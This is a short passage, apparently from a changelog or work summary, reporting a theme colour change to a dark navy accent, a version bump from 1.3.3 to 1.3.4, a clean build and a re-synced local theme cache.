`--accent-active-color: #1a1a2e` (dark navy, for contrast on yellow), version bumped
`1.3.3` -> `1.3.4`. Verified via `bun run build` (clean) and re-synced the local theme cache
copy again.
